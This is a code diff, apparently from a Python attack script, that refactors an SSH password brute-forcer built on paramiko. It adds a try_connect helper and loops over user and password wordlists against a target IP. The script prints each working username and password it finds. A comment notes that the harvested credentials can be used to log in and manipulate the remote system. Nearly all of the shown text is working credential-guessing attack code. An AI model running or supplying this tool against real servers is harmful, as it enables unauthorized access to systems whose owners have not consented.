@@ -49,30 +49,61 @@ def brute_force_FTP(targetIP: str) -> None:
                 print(f"[!] {error}")
     return FTP_credentials
 
+def try_connect(hostname, username, password, port=22) -> dict:
+    """_summary_
+    Args:
+        hostname (str): hostname
+        username (str): username
+        password (str): password
+        port (int, optional): port number Defaults to 22.
+    Returns:
+        dict: dict consists of three parameters: ip, user and password if those are valid otherwise returns False:bool
+    """
+    logging.getLogger('paramiko.transport').addHandler(NullHandler())
+    # initialize SSH client
+    client = paramiko.SSHClient()
+    # add to know hosts
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        client.connect(hostname=hostname, username=username, password=password, timeout=10, port=port)
+    except socket.timeout:
+        # this is when host is unreachable
+        print(f"[!] Host: {hostname} is unreachable, timed out.")
+        return False
+    except paramiko.AuthenticationException:
+        print(f"[!] Invalid credentials for {username}:{password}")
+        return False
+    except paramiko.SSHException:
+        print(f"[*] Quota exceeded, retrying with delay...")
+        # sleep for ten seconds
+        time.sleep(10)
+        return try_connect(hostname, username, password, port)
+    else:
+        # connection was established successfully
+        print(f"[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
+        return {'hostname' : hostname, 'username' : username, 'password' : password}
+
 def brute_force_SSH(targetIP: str) -> dict:
     """Gets ip address and tries to login to SSH server 
     users and passwords from file
     uses module paramiko.SSHClient()
-
     Args:
         targetIP (str): ip address
-    
     Returns: SSH_cerdentials (dict) : key: targetIP, value: list of lists; each list consists of pair user and password
     """
     print(f"Calling: brute_force_SSH on {targetIP}")
 
     # files: users and passwords operations
-
     password_file = "passwd.txt"
-    users_file = "users.txt"
-    users = open(users_file)
     passwds = open(password_file)
-    users_list = users.read().split("\n")
-    pass_list = passwds.read().split("\n")
-    users.close()
+    pass_list = passwds.readlines()
     passwds.close()
 
-    # initialize SSH client
+    users_file = "users.txt"
+    users = open(users_file)
+    users_list = users.readlines()
+    users.close()
+
     SSH_credentials = {}
     user_pass = []
 
@@ -80,37 +111,12 @@ def brute_force_SSH(targetIP: str) -> dict:
         user = user.strip()
         for passwd in pass_list:
             passwd = passwd.strip()
-            try:
-                sshserver = paramiko.SSHClient()
-                # add to know hosts
-                sshserver.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                sshserver.load_system_host_keys()
-                sshserver.connect(hostname=targetIP, username=user, password=passwd, timeout=3, banner_timeout=2000, auth_timeout=60)
-                tr = sshserver.get_transport()
-                tr.banner_timeout = 3000
-                tr.set_keepalive(3)
-                tr.close()
-                tr.stop_thread()
-                sshserver.close()
-            except socket.timeout:
-                # this is when host is unreachable
-                print(f"[!] Host: {targetIP} is unreachable, timed out.")
-            except paramiko.AuthenticationException:
-                print(f"[!] Invalid credentials for {user}:{passwd}")
-            except paramiko.SSHException:
-                print(f"[*] Quota exceeded, retrying with delay...")
-                # sleep for a minute
-                time.sleep(3)
-            else:
-                # connection was established successfully
-                print(f"[+] Found combo for SSH:\n\tHOSTNAME: {targetIP}\n\tUSERNAME: {user}\n\tPASSWORD: {passwd}")
-                user_pass.append([user, passwd])
-                sshserver.close()
+            if try_connect(targetIP, user,passwd):
+                user_pass.append([user,passwd])
                 break
-
-
+        
     SSH_credentials[targetIP] = user_pass
-    return SSH_credentials # this dict can be used in another function to log in and manipulate on remote system
+    return SSH_credentials # this dict can be used in another function to log in and manipulate on remote system 
 
 
 def read_file(slownik: dict, target_ip):
